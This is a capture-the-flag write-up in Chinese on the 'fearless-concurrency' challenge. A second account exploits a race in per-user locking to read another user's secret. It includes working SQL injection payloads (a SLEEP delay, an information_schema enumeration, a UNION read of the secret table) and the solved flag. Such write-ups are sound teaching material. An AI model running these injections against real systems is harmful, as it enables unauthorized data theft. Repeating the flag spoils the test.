# fearless-concurrency

## 题目简述

每次 `/query` 都创建一个随机表保存当前用户的 32 位 secret，执行用户可控的 SQL 条件后立即删表。程序用 Mutex 阻止同一用户并发查询，却没有保护所有用户共享的 MySQL 数据库。结合 SQL 注入和第二个账号，可在第一个请求休眠期间枚举临时表并读出 secret。

## 解题过程

先注册两个用户 $u_1,u_2$。表名格式为：

```text
tbl_SHA1("fearless_concurrency" || little_endian_u64(user_id))_RANDOM_U32
```

前缀可由公开的 $u_1$ 计算，只有末尾 32 位随机数未知。以 $u_1$ 发起请求，把查询字符串设为：

```sql
' OR SLEEP(10);#
```

后端在执行这条注入 SQL 前已经创建并填充 $u_1$ 的临时表；`SLEEP(10)` 让处理流程停住，延迟后面的 `DROP TABLE`。该请求占用的只是 $u_1$ 自己的 Mutex。

等待约一秒后，以 $u_2$ 查询 `information_schema.tables`，按已知前缀找出完整表名：

```sql
' UNION SELECT table_name
FROM information_schema.tables
WHERE table_name LIKE 'tbl_KNOWN_SHA1_%';#
```

随后仍在十秒窗口内，再以 $u_2$ 读取该表：

```sql
' UNION SELECT secret FROM FULL_TABLE_NAME;#
```

最后把读出的整数作为 $u_1$ 的 secret 提交给 `/flag`。服务端只比较用户 ID 对应的 secret，因此返回：

```text
grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5}
```

## 方法总结

Rust 的内存安全与异步 Mutex 无法修复错误的同步边界。这里锁按用户划分，受保护资源却是所有连接共同可见的数据库命名空间；第二个用户自然绕过锁。临时敏感数据应使用连接作用域的临时表、不可注入的参数化查询，并让锁粒度与真实共享资源一致。
